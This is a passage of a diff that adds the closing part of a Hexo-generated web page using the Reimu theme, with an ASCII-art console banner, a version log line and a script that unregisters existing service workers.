+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.6' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
